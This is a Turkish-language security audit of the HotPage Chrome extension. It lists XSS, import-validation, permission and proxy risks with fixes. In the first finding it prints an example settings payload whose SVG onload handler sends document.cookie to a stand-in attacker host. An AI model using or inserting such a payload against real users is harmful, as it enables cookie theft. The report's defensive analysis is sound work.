# HotPage Chrome Extension - Security Analysis Report

> **Analiz Tarihi:** 2025-12-14  
> **Kapsam:** Security, Privacy, Chrome Web Store Policy  
> **Odak:** XSS, Data Leak, Permission Abuse

---

## 🔴 YÜKSEK RİSKLİ SORUNLAR

### 1. XSS Açığı: `dangerouslySetInnerHTML` ile Kullanıcı Verisi Render Etme

**Etkilenen Dosyalar:**
| Dosya | Satır | Açıklama |
|-------|-------|----------|
| `QuickLinks.tsx` | 164 | `link.icon` kullanıcı tarafından sağlanıyor |
| `QuickLinks.tsx` | 301 | Icon library'den SVG render |
| `Currency.tsx` | 385, 412 | Döviz/kripto ikonları |
| `Weather.tsx` | 238 | Hava durumu ikonları |
| `SearchBar.tsx` | 68, 86 | Arama motoru ikonları |
| `RSS.tsx` | 46 | Warning ikonu |

**Problem:**
```tsx
// QuickLinks.tsx:164 - KULLANICI VERİSİ!
<div className="quick-link-icon-svg" dangerouslySetInnerHTML={{ __html: link.icon }} />
```

**Risk Seviyesi:** 🔴 **YÜKSEK**

**Açıklama:**
- Kullanıcılar özel SVG ikonu yapıştırabilir
- Kötü niyetli SVG içinde `<script>` veya `onerror` handler olabilir
- Settings import özelliği ile zararlı payload enjekte edilebilir

**Örnek Saldırı:**
```json
{
  "quickLinks": [{
    "id": "malicious",
    "title": "Click me",
    "url": "https://safe.com",
    "iconType": "svg",
    "icon": "<svg onload=\"fetch('https://evil.com/steal?cookie='+document.cookie)\"></svg>"
  }]
}
```

**Çözüm Önerisi:**
```typescript
// SVG sanitizer kullan
import DOMPurify from 'dompurify';

const sanitizedIcon = DOMPurify.sanitize(link.icon, {
  USE_PROFILES: { svg: true, svgFilters: true },
  FORBID_TAGS: ['script'],
  FORBID_ATTR: ['onerror', 'onload', 'onclick']
});
```

---

### 2. Settings Import Zafiyeti

**Dosya:** `storage.ts` (L162-169), `SettingsPanel.tsx` (L115-133)

**Problem:**
```typescript
// storage.ts
export const importSettings = (json: string): Settings | null => {
  try {
    const parsed = JSON.parse(json);
    return { ...defaultSettings, ...parsed }; // ❌ Validasyon yok!
  } catch (error) {
    return null;
  }
};
```

**Risk Seviyesi:** 🔴 **YÜKSEK**

**Açıklama:**
- Import edilen JSON doğrulanmıyor
- Zararlı SVG, URL veya script enjekte edilebilir
- Prototype pollution riski var

**Çözüm Önerisi:**
```typescript
import { z } from 'zod';

const QuickLinkSchema = z.object({
  id: z.string(),
  title: z.string().max(100),
  url: z.string().url(),
  icon: z.string().optional(),
  iconType: z.enum(['svg', 'favicon', 'custom', 'none']).optional()
});

const SettingsSchema = z.object({
  quickLinks: z.array(QuickLinkSchema).max(50),
  // ... diğer alanlar
});

export const importSettings = (json: string): Settings | null => {
  try {
    const parsed = JSON.parse(json);
    return SettingsSchema.parse(parsed);
  } catch {
    return null;
  }
};
```

---

## 🟠 ORTA RİSKLİ SORUNLAR

### 3. Aşırı Geniş Host Permissions

**Dosya:** `manifest.json` (L40-42)

```json
"host_permissions": [
  "*://*/"
]
```

**Risk Seviyesi:** 🟠 **ORTA**

**Chrome Web Store Policy İhlali Potansiyeli:**
- Manifest V3'te geniş izinler Chrome review'da red alabilir
- "Use the minimum required permissions" prensibi ihlali
- Kullanıcı güvenini azaltır

**Açıklama:**
- Tüm web sitelerine erişim izni isteniyor
- Sadece widget API'leri için bu kadar geniş izin gerekmez

**Çözüm Önerisi:**
```json
"host_permissions": [
  "https://api.open-meteo.com/*",
  "https://api.exchangerate-api.com/*",
  "https://api.coingecko.com/*",
  "https://nominatim.openstreetmap.org/*",
  "https://api.nbp.pl/*",
  "https://ipapi.co/*",
  "https://corsproxy.io/*",
  "https://api.codetabs.com/*",
  "https://api.allorigins.win/*"
]
```

---

### 4. RSS Feed - Güvenilmeyen CORS Proxy'ler

**Dosya:** `RSS.tsx` (L181-185)

```typescript
const proxies = [
  { name: 'corsproxy.io', url: `https://corsproxy.io/?${encodeURIComponent(feedUrl)}` },
  { name: 'codetabs', url: `https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(feedUrl)}` },
  { name: 'allorigins', url: `https://api.allorigins.win/raw?url=${encodeURIComponent(feedUrl)}` },
];
```

**Risk Seviyesi:** 🟠 **ORTA**

**Açıklama:**
- Üçüncü parti proxy servisleri güvenilir değil
- Bu proxy'ler trafiği izleyebilir veya manipüle edebilir
- Servis kesintisi riski

**Potansiyel Riskler:**
1. Man-in-the-middle saldırısı
2. Veri sızıntısı (hangi RSS'leri takip ettiğiniz)
3. Proxy'nin zararlı içerik enjekte etmesi

**Çözüm Önerisi:**
- Kendi backend proxy'nizi kullanın
- Veya background service worker ile doğrudan fetch yapın (extension'da CORS yok)

---

### 5. Harici API'lerden Gelen Veri Doğrulaması Eksik

**Etkilenen Dosyalar:**
| Widget | API | Dosya |
|--------|-----|-------|
| Weather | open-meteo.com, nominatim.openstreetmap.org | `Weather.tsx` |
| Currency | exchangerate-api.com, coingecko.com, nbp.pl | `Currency.tsx` |
| RSS | Kullanıcı tanımlı RSS URL'leri | `RSS.tsx` |

**Risk Seviyesi:** 🟠 **ORTA**

**Problem:**
```typescript
// Weather.tsx - API yanıtı doğrudan kullanılıyor
const data = await response.json();
const current = data.current; // ❌ Type check yok

const weatherData = {
  temperature: Math.round(current.temperature_2m), // current undefined olabilir
  // ...
};
```

**Çözüm Önerisi:**
```typescript
// Runtime type checking
if (!data?.current?.temperature_2m) {
  throw new Error('Invalid API response');
}
```

---

### 6. SecretLinks - Incognito API Hata Yönetimi

**Dosya:** `SecretLinks.tsx` (L156-194)

```typescript
if (typeof chrome !== 'undefined' && chrome?.windows?.create) {
  try {
    chrome.windows.create({ url, incognito: true }, () => {
      onClose();
    });
    return; // ❌ callback hata kontrolü yok
  } catch (error) {
    // ...
  }
}
```

**Risk Seviyesi:** 🟠 **ORTA**

**Açıklama:**
- `chrome.runtime.lastError` kontrol edilmiyor
- Incognito izni yoksa sessizce başarısız olur
- Kullanıcıya hata mesajı gösterilmiyor

**Çözüm Önerisi:**
```typescript
chrome.windows.create({ url, incognito: true }, () => {
  if (chrome.runtime.lastError) {
    console.error('Incognito error:', chrome.runtime.lastError);
    openFallback(); // Normal pencerede aç
    return;
  }
  onClose();
});
```

---

## 🟡 DÜŞÜK RİSKLİ SORUNLAR

### 7. localStorage'da Hassas Veri

**Dosya:** `storage.ts`

```typescript
const STORAGE_KEY = 'hotpage-settings';
localStorage.setItem(STORAGE_KEY, JSON.stringify(settingsToSave));
```

**Risk Seviyesi:** 🟡 **DÜŞÜK**

**Açıklama:**
- SecretLinks URL'leri localStorage'da saklanıyor
- Aynı domain'deki XSS bu verilere erişebilir
- Browser devtools ile görüntülenebilir

**Not:** Extension context'te bu daha az riskli, ama web sayfası olarak çalıştırıldığında dikkatli olunmalı.

---

### 8. Kullanıcı Yüklü Görseller - Boyut Limiti Yok

**Dosya:** `imageStorage.ts`

```typescript
async saveImage(file: File): Promise<string> {
  // ❌ Dosya boyutu kontrolü yok
  const imageData: StoredImage = {
    id,
    blob: file,
    filename: file.name,
    uploadedAt: Date.now(),
  };
  // ...
}
```

**Risk Seviyesi:** 🟡 **DÜŞÜK**

**Açıklama:**
- Çok büyük dosyalar IndexedDB'yi doldurabilir
- Performans sorunlarına yol açabilir

**Çözüm Önerisi:**
```typescript
const MAX_IMAGE_SIZE = 10 * 1024 * 1024; // 10MB

if (file.size > MAX_IMAGE_SIZE) {
  throw new Error('Image too large');
}
```

---

### 9. Console Logging Production'da Aktif

**Dosya:** `logger.ts`

**Risk Seviyesi:** 🟡 **DÜŞÜK**

**Açıklama:**
- Debug logları production build'de de görünebilir
- Hassas bilgi sızıntısı potansiyeli (feed URL'leri, lokasyon)

---

## 📋 CHROME WEB STORE POLİCY UYUMLULUK

| Kural | Durum | Notlar |
|-------|-------|--------|
| Minimum gerekli izinler | ⚠️ | `*://*/` çok geniş |
| Kullanıcı verisi gizliliği | ✅ | Tüm veriler yerel |
| Remote code execution | ✅ | `eval()` kullanılmıyor |
| Clear user disclosure | ⚠️ | Privacy policy linki yok |
| Data collection disclosure | ✅ | Veri toplanmıyor |

---

## 🛡️ ÖNERİLEN DÜZELTMELER (Öncelik Sırasına Göre)

### Acil (Yayın Öncesi)
1. ✅ `DOMPurify` ile SVG sanitization ekle
2. ✅ Settings import'a schema validation ekle
3. ✅ `host_permissions` kapsamını daralt

### Yüksek Öncelik
4. RSS proxy'lerini kendi backend'e taşı veya service worker kullan
5. API response validation ekle
6. Incognito API hata yönetimini düzelt

### Orta Öncelik
7. Görsel yükleme için boyut limiti ekle
8. Production build'de debug loglarını devre dışı bırak
9. Privacy policy sayfası ekle

---

## 📦 ÖNERİLEN BAĞIMLILIKLAR

```bash
npm install dompurify @types/dompurify  # SVG sanitization
npm install zod                          # Runtime type validation
```

---

## ✅ POZİTİF GÜVENLİK BULGULARI

- ❌ `eval()` kullanımı YOK
- ❌ `innerHTML` kullanımı YOK (dangerouslySetInnerHTML dışında)
- ❌ Remote code execution riski YOK
- ❌ Background script'te tehlikeli işlemler YOK
- ✅ `rel="noopener noreferrer"` kullanılıyor
- ✅ URL'ler `encodeURIComponent` ile encode ediliyor
- ✅ Hassas veriler sunucuya iletilmiyor
- ✅ Tüm veriler localStorage/IndexedDB'de yerel kalıyor
